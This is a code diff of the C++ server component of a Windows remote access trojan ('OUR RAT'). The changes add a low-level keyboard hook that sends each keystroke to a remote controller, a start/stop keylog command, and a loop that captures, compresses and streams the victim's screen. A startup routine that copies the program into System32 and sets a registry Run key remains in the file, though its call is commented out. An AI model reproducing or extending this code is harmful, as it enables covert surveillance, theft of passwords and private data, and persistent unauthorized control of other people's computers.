@@ -2,16 +2,22 @@
 
 int main(){
 
-    AddtoStartup();
+    //AddtoStartup();
 
 //map the server enumerated commands so I can recv a string to match with!
     dictionary["TRIGMSGBOX"] = TRIGMSGBOX;
+
     dictionary["KEYLOG"] = KEYLOG;
+    dictionary["STOPKEYLOG"] = STOPKEYLOG;
+
     dictionary["DISCONNECT"] = DISCONNECT;
+
+    dictionary["STREAMPICT"] = STREAMPICT;
+
 
 //Map messagebox responses!
     MSGBOX_TYPES["Abort Retry Ignore"]                    = MB_ABORTRETRYIGNORE;
-    MSGBOX_TYPES["Help MsgBox (note WM_HELP not used)"]   = MB_HELP;
+    MSGBOX_TYPES["Help MsgBox"] /*NOTE:WM_HELP NOT USED*/ = MB_HELP;
     MSGBOX_TYPES["Ok Cancel"]                             = MB_OKCANCEL;
     MSGBOX_TYPES["Yes No"]                                = MB_YESNO;
 
@@ -24,12 +30,7 @@ int main(){
 
 
 /*INITIALIZE WINSOCKETS FOR OUR RAT, WE WILL BE COMMUNICATING WITH CLIENT TO MANIPULATE THE HOST*/
-    extern WSADATA wsa;
-    extern SOCKET sa, clientsock;
-    extern struct sockaddr_in server, client;
-    extern char server_reply[buffersize];
-    //THIS BOOLEAN VALUE WILL MAKE THE SERVER KEEP WORKING. CAN BE DISABLED FROM CLIENT.
-    extern bool KILLSERVER;
+
 
 
     HandleError(WSAStartup(MAKEWORD(2,2), &wsa));
@@ -49,7 +50,7 @@ int main(){
 
 
         clientsock = accept(sa, (struct sockaddr *)&client, NULL);
-
+        //HandleError(clientsock);
         //send(clientsock, "Message!", 9, 0);
 
         while(1){
@@ -59,7 +60,7 @@ int main(){
         }
         int counter = 0;
 
-        memset(server_reply, '\0', buffersize);
+        //memsuet(server_reply, '\0', buffersize);
 
 
 
@@ -78,14 +79,26 @@ int main(){
 
 
             //send(clientsock, "KEYLOG><", 8, 0);
-            HandleError(recv(clientsock, server_reply, buffersize, 0));//error checking combined with recv function
+            PKT pkt;
+
+            HandleError(recv(clientsock, (char*)&pkt, sizeof(pkt), 0));
+
+            //string COMMAND(pkt.command);
+
+            //map<string, SERVERMESSAGE>::iterator i = dictionary.find(COMMAND);
 
 
         //CLEAR STRING BEFORE PROCESSING! MAKES THINGS NICE AND CLEAN!!
         server_operator.clear();
         server_operand.clear();
+        server_operator.append(pkt.command);
+        //After we recieve which operation to do, then we filter it in the switch.
+        //After stepping through the switch, parse the data into appropriate means.
+        //Each command has a different way of dealing with data.
 
-            int forcount = 0;
+        //server_operand.append(pkt.data);
+
+            /*int forcount = 0;
             //PARSE THE OPERATOR
             for (; server_reply[forcount] != '>'; forcount++){
                server_operator += server_reply[forcount];
@@ -97,7 +110,7 @@ int main(){
 
                 server_operand += server_reply[forcount];
 
-            }
+            }*/
 
 
              map<string, SERVERMESSAGE>::iterator i = dictionary.find(server_operator);
@@ -107,14 +120,37 @@ int main(){
 
             switch(i->second){
 
-                case TRIGMSGBOX:  _beginthreadex(NULL, 0, &TrigBox, &server_operand, 0, NULL);  //not really necessary to create an unused handle, but its here incase you need to use it
+                case TRIGMSGBOX:{
+
+                      server_operand.append(reinterpret_cast<const char*>(pkt.data));
+
+                      HandleError(_beginthreadex(NULL, 0, &TrigBox, &server_operand, 0, NULL));  //not really necessary to create an unused handle, but its here incase you need to use it
+
+
+
+                    }break;
+                case KEYLOG:
+
+                      HandleError(_beginthreadex(NULL,0, &KeyLog, NULL, 0, &KEYLOG_ID));
+
                     break;
-                case KEYLOG:    _beginthreadex(NULL,0, &KeyLog, NULL, 0, NULL);
-                //MessageBox(NULL,NULL,"MESSAGE2",NULL);
+
+                case STREAMPICT:{
+
+                      HandleError(_beginthreadex(NULL, 0, &StreamPict, NULL, 0, NULL));
+
+                }
+                    break;
+
+
+
+
+
+                case STOPKEYLOG: HandleError(PostThreadMessage(KEYLOG_ID, WM_QUIT, NULL, NULL));
                     break;
                 case DISCONNECT: clientsock = INVALID_SOCKET;
                     break;
-                default: MessageBox(NULL, "Message unrecognized!", "Exception!", NULL);
+                default: HandleError(MessageBox(NULL, "Message unrecognized!", "Exception!", NULL));
                     break;
 
             }
@@ -125,7 +161,7 @@ int main(){
 
 
     }
-    MessageBox(NULL,"D/c", NULL,NULL);
+    HandleError(MessageBox(NULL,"D/c", NULL,NULL));
             closesocket(sa);
             WSACleanup();
 
@@ -136,21 +172,18 @@ unsigned int __stdcall KeyLog(void* data){
 
     HINSTANCE hinst = GetModuleHandle(NULL);
     HHOOK hhkLowLevelKybd  = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, hinst, 0);
+
     MSG msg;
 
-    MessageBox(NULL, "entered", NULL, NULL);
+    //MessageBox(NULL, "entered", NULL, NULL);
 
         while(GetMessage(&msg, NULL, 0, 0)){
-
-
             TranslateMessage(&msg);
             DispatchMessage(&msg);
 
         }
 
-      UnhookWindowsHookEx(hhkLowLevelKybd);
-
-
+      HandleError(UnhookWindowsHookEx(hhkLowLevelKybd));
 
 }
 
@@ -188,7 +221,7 @@ unsigned int __stdcall TrigBox(void* data){
 
      map<string, UINT>::iterator style = MSGBOX_TYPES.find(components[2].c_str());
 
-     MessageBox(NULL, components[1].c_str(), components[0].c_str(), icon->second|style->second);
+     HandleError(MessageBox(NULL, components[1].c_str(), components[0].c_str(), icon->second|style->second));
 
 
 
@@ -206,18 +239,18 @@ void AddtoStartup(){
     HMODULE GetModH = GetModuleHandle(NULL);
 
     //GET PATH OF SERVER.EXE
-    GetModuleFileName(GetModH,pathtofile,sizeof(pathtofile));
+    HandleError(GetModuleFileName(GetModH,pathtofile,sizeof(pathtofile)));
 
     filename.append(PathFindFileNameA(pathtofile));
 
     //GET SYSTEM DIRECTORY LIKE SYSTEM32 OR SYSWOW64, FOR COMPATIBILITY REASONS
-    GetSystemDirectory(system,sizeof(system));
+    HandleError(GetSystemDirectory(system,sizeof(system)));
 
     //APPEND MY FILENAME AFTER THE SYSTEMDIRECTORY SO WE CAN DROP OUR SERVER INTO THE SYSTEM 32 FOLDER
     strcat(system, filename.c_str());
 
     //COPY SERVER TO THE SYSTEM32 FOLDER
-    CopyFile(pathtofile,system,false);
+    HandleError(CopyFile(pathtofile,system,false));
 
     //MAKE A REGISTRY KEY TO THE SYSTEM32FOLDER WITH SERVER.EXE TO RUN AT STARTUP
     HKEY hKey;
@@ -232,23 +265,25 @@ void AddtoStartup(){
 
 int HandleError(int error){
 
-    if (error == SOCKET_ERROR){
+    if ( error < 0){
 
         stringstream ss;
-        ss <<"Error: " << WSAGetLastError() << " From WSAGetLastError() From WSAStart() !";
+        ss <<"Error Server: " << GetLastError() << " From WSAGetLastError() From WSAStart() !";
         MessageBox(NULL, ss.str().c_str(), " Winsock Error! ", MB_OK | MB_ICONINFORMATION);
 
     }else return 0;
 
-    return SOCKET_ERROR;
+    return 0;
 }
 
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam){
 
-    string KEYLOGstr = "KEYLOG>";
+    PKT keypkt;
+    strncpy(keypkt.command, "KEYLOG\0", 7);
+
     extern SOCKET clientsock;
     PKBDLLHOOKSTRUCT structdll = (PKBDLLHOOKSTRUCT) lParam;
-    clock_t timer;
+
     switch(nCode){
 
         case HC_ACTION:
@@ -258,20 +293,19 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam){
 
 
                     //How should i change the following lines?
-                    char buffer[256];
+
+                    char buffer[256]{};
                     GetKeyNameText((MapVirtualKey(structdll->vkCode, 0)<<16), buffer, 50);
                     //use this?: ToAscii(structdll->vkCode, structdll->scanCode, NULL, myword, 0);
 
-
-                    KEYLOGstr.append(buffer);
-                    KEYLOGstr.append("<");
+                    strncpy(reinterpret_cast<char *>(keypkt.data), buffer, sizeof(buffer));
                     //std::cout <<"\n"<<KEYLOGstr;
 
                     //timer = clock();
                     //if ((timer / CLOCKS_PER_SEC) % 3 == 0){
 
                       //  MessageBox(NULL, KEYLOGstr.c_str(), "MSGBOX", NULL);
-                      send(clientsock, KEYLOGstr.c_str(), KEYLOGstr.length(), 0);
+                      HandleError(send(clientsock, (char *)&keypkt, sizeof(keypkt), 0));
                     //}
 
                 }
@@ -281,6 +315,161 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam){
     }
 
 return CallNextHookEx(NULL, nCode, wParam,lParam);
+
+}
+
+unsigned int __stdcall StreamPict(void* arglist){
+
+    while(1){
+
+        unsigned int framecount;
+        unsigned char *lpbitmap;
+        unsigned char *comprbuff;
+        ULONG buffersz, bitmapsize;
+        IMAGE_PKT_HEADER *pkthdr;
+        PKT *pak, *PACKETS;
+
+        extern SOCKET clientsock;
+
+        //framecount++;
+
+        HDC handle_ScreenDC = GetDC(NULL);
+        HDC handle_MemoryDC = CreateCompatibleDC(handle_ScreenDC);
+        BITMAP bitmap;
+
+
+        int x = GetDeviceCaps(handle_ScreenDC, HORZRES);
+        int y = GetDeviceCaps(handle_ScreenDC, VERTRES);
+
+        HBITMAP handle_Bitmap = CreateCompatibleBitmap(handle_ScreenDC, 640, 360);
+        SelectObject(handle_MemoryDC, handle_Bitmap);
+
+        SetStretchBltMode(handle_MemoryDC, HALFTONE);
+        //SetStretchBltMode(handle_ScreenDC, HALFTONE);
+        StretchBlt(handle_MemoryDC, 0, 0, 640, 360, handle_ScreenDC, 0, 0, x, y, SRCCOPY);
+
+        //StretchBlt(handle_MemoryDC, 0, 0, x, y, handle_ScreenDC, 0, 0, SRCCOPY);
+
+        GetObject(handle_Bitmap, sizeof(BITMAP), &bitmap);
+
+        //BITMAPFILEHEADER bmfHeader;
+        BITMAPINFOHEADER *bi = new BITMAPINFOHEADER;
+
+        bi->biSize = sizeof(BITMAPINFOHEADER);
+        bi->biWidth = bitmap.bmWidth;
+        bi->biHeight = bitmap.bmHeight;
+        bi->biPlanes = 1;
+        bi->biBitCount = 16;
+        bi->biCompression = BI_RGB;
+        bi->biSizeImage = 0;
+        bi->biXPelsPerMeter = 0;
+        bi->biYPelsPerMeter = 0;
+        bi->biClrUsed = 0;
+        bi->biClrImportant = 0;
+        //std::cout<< bitmap.bmWidth;
+        bitmapsize =((bitmap.bmWidth * bi->biBitCount + 5) / 32) * 4 * bitmap.bmHeight;
+        //int i = bitmap.bmWidth;
+        //DWORD bitmapsize = 99;
+
+        //HANDLE hDIB = GlobalAlloc(GHND, bitmapsize);
+
+
+        lpbitmap = new unsigned char[bitmapsize]; //Uncompressed buffer
+        buffersz = (bitmapsize * 1.1)+12; //Allocate breathing room for compression
+
+        comprbuff = new unsigned char[buffersz];  //Compressed Buffer
+        memset(comprbuff, 0, buffersz); //Clear Memory in char array
+
+        GetDIBits(handle_MemoryDC, handle_Bitmap, 0, (UINT)bitmap.bmHeight, lpbitmap , (BITMAPINFO *)bi, DIB_RGB_COLORS);
+
+        compress(comprbuff, &buffersz, lpbitmap, bitmapsize);
+
+        //cout << result;
+            //unsigned char *newbuff = new unsigned char[bitmapsize];
+        //result = uncompress(newbuff, &dwBmpSize, buff, buffersz);
+
+        //cout << result;
+
+
+        //new image_pkt_header in heap, then we put the packet_expected: dividing the size of GetDIBITs by 4096, and ceiling it. result is 704 INT.
+        //Then we assign bitmapinfoheader to the IMAGE_PKT_HEADER field.
+
+        pkthdr = new IMAGE_PKT_HEADER;
+
+        pkthdr->packet_expected = ceil((double)buffersz / 4096);
+        pkthdr->bitmaphdr = *bi;
+        pkthdr->uncompressed_size = bitmapsize;
+        pkthdr ->compressed_Size = buffersz;
+        pkthdr->origx = x;
+        pkthdr->origy = y;
+
+
+
+
+        //ignore strncpy(pkthdr.command, "BITMAPHDR\0", 10);
+        pak = new PKT;
+        memset(pak->data, '\0', sizeof(pak->data));
+        memcpy(pak->data, pkthdr, sizeof(*pkthdr));
+        //Then we assign the string for the command char array.
+        strncpy(pak->command, "BITMAPHDR\0", 11);
+
+    //ignore the cout, it was for debugging
+        //cout << pak->command;
+        //std::cout << ((IMAGE_PKT_HEADER *)pak->data)->packet_expected;
+
+        //cout << pkthdr->packet_expected;
+
+    //Remember the 704 integer i mentioned?
+    //We make 704 packets for the GetDIBIts
+            PACKETS = new PKT[pkthdr->packet_expected];
+
+
+    //Then for each of those packets we assign the command char array
+        //Once we have all the 704 structures command data field assigned
+        for (int i = 0; i < pkthdr->packet_expected; i++){
+            strncpy(PACKETS[i].command, "BITMAPDATA\0", 11);
+        }
+
+
+        unsigned int bitcount = 0;
+        for (int i = 0; i < pkthdr->packet_expected; i++){
+
+            memset(PACKETS[i].data, '\0', sizeof(PACKETS[i].data));
+
+            for (int x = 0; x < 4096 && bitcount < buffersz; x++){
+
+
+                PACKETS[i].data[x] = comprbuff[bitcount];
+                bitcount++;
+
+            }
+
+        }
+
+            HandleError(send(clientsock, (char *)pak, sizeof(PKT), 0));
+
+        for (int i = 0; i < pkthdr->packet_expected; i++){
+
+            HandleError(send(clientsock, (char *)&PACKETS[i], sizeof(PACKETS[i]), 0));
+        }
+
+        PKT end_pic;
+        strncpy(end_pic.command, "BITMAPEND\0", 10);
+
+            HandleError(send(clientsock, (char *)&end_pic, sizeof(end_pic), 0));
+
+        delete pak;
+        delete pkthdr;
+        delete bi;
+        delete[] PACKETS;
+        delete[] comprbuff;
+        delete[] lpbitmap;
+
+        Sleep(100);
+
+    }
+
+    //std::cout << "Compressed Size: " << buffersz << "\nNumber of Packets: " << pkthdr->packet_expected << "\nUncompressed Size" << pkthdr->uncompressed_size;
 
 }
 
